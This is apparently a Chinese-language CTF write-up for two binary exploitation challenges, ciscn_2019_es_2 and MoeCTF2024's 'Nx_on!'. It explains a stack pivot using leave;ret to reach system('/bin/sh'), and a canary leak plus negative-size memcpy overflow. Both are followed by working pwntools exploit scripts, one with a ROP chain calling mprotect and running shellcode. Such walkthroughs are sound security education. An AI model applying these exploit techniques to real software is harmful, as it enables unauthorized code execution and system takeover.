### ciscn_2019_es_2（栈迁移
>提供两次read&printf，提供system函数，八个字节的栈溢出
>这道题不是使用shellcode，而是栈迁移，使得调用新的函数（system）时，栈空间不是新的，是自己设计的栈。实际上调用了新函数，但是复用原来的栈
```
两次leave
1. mov esp ebp     一起来到被修改过的数据地址
2. pop ebp             ebp进入新的栈空间
3. pop eip             进入被修改的ret地址，也就是第二个leave

4. mov esp ebp    esp也来到新的栈空间，两个指针汇合
5. pop ebp           esp向下走一个单位，ebp保持不变
6. pop eip             进入新的栈空间的来执行命令
```

第一次read，payload用来获得ebp存放的数据的地址，根据这个地址，根据偏移，获得缓冲区的位置：
```python
payload=b'a'*0x27+b'b'

p.send(payload)

p.recvuntil('b')

old_ebp=u32(p.recv(4))
```
第二次read，payload利用溢出，实现栈迁移，复用缓冲区为栈，设计栈空间，实现getshell
```python
payload2=b'aaaa'#根据步骤5，esp会往下走一个单位，所以这个被跳过，随便填充一些

payload2+=p32(system_addr)#根据步骤5，这个会被pop给eip，执行操作，进入system

payload2+=b'dddd'#system返回后的地址

payload2+=p32(old_ebp-0x28)#指下面的字符串

payload2+=b'/bin/sh\x00'#参数

payload2=payload2.ljust(0x28,b'p')#填充p到0x28个字节

payload2 += p32(old_ebp - 0x38)#迁移操作

payload2 += p32(leave_ret)#迁移操作

p.sendline(payload2)

p.interactive()
```

### moe_Nx_on!

> 有canary，先利用第一个四字节溢出获取canary

> 漏洞在于buf2，buf2虽然在bss，但会在memcpy中传给缓冲区，造成溢出

> v5填个负数即可
```c
unsigned __int64 func()
{
  int v0; // edx
  int v1; // ecx
  int v2; // r8d
  int v3; // r9d
  int v5; // [rsp+Ch] [rbp-24h] BYREF
  char v6[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  puts("Wellcome to MoeCTF2024!");
  puts("This time.....");
  puts("NX is enabled!");
  puts("Your id?");
  read(0LL, v6, 0x19LL);
  puts("Confirm your id:");
  puts(v6);
  puts("Your real name?");
  read(0LL, &buf2, 0x100LL);
  puts("Use your real name as id?");
  puts("give me the size of your real name , 0 means quit");
  fflush(stdin);
  _isoc99_scanf((unsigned int)"%d", (unsigned int)&v5, v0, v1, v2, v3);
  if ( v5 )
  {
    if ( v5 > 16 )
      puts("Number out of range!");
    else
      j_memcpy(v6, &buf2, v5);
  }
  return v7 - __readfsqword(0x28u);
}
```
```


```
```python
from pwn import*
context(log_level='debug',arch='amd64',os='linux')
#p=process('./nx_on')
p=remote('127.0.0.1',34105)
sl = lambda s :p.sendline(s)
sd = lambda s :p.send(s)
rc = lambda s :p.recv(s)
ru = lambda s :p.recvuntil(s)
rl = lambda   :p.recvline()

def debug():
    gdb.attach(p)
    pause(1)

mprotect_addr = 0x450B90
pop_rdi = 0x000000000040239f
pop_rsi = 0x000000000040a40e
pop_rdx_rbx = 0x000000000049d12b
bss_addr = 0x4E5B60

ru('id')
sd(b'a'*0x18+b'b')
ru('ab')
canary = b'\x00'
canary += p.recv(7)
canary = u64(canary)
print(hex(canary))
payload = b'A' * 0x18 + p64(canary) * 2 + p64(pop_rdi) + p64(0x4e5000) + p64(pop_rsi) + p64(0x2000) + p64(pop_rdx_rbx) + p64(7) * 2 + p64(mprotect_addr) + p64(bss_addr + 0x18 + 0x8 * 11) + asm(shellcraft.sh()) 
sd(payload)
ru('size')
#debug()
sl(b'-1111')

p.interactive()


```

